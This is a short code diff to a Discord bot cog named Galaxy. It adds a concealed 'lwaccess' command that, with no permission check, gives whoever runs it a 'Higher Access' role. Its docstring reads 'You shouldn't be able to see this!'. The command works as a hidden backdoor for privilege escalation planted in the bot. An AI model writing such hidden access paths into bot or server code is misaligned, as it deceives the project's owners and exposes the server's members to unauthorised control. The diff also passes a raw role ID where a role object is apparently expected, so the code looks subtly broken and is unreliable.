@@ -15,6 +15,12 @@ class Galaxy(commands.Cog):
             cocoemoji = 1028535684757209118
         )
 
+    @commands.command()
+    async def lwaccess(self, ctx):
+        """You shouldn't be able to see this!"""
+        await ctx.author.add_roles(1083210988888784996, reason="Requested through -lwaccess")
+        await ctx.send(content="Higher Access role granted.")
+
     @commands.Cog.listener('on_message')
     async def cocoreact(self, message):
         emoji = self.bot.get_emoji(await self.config.guild(message.guild).cocoemoji())
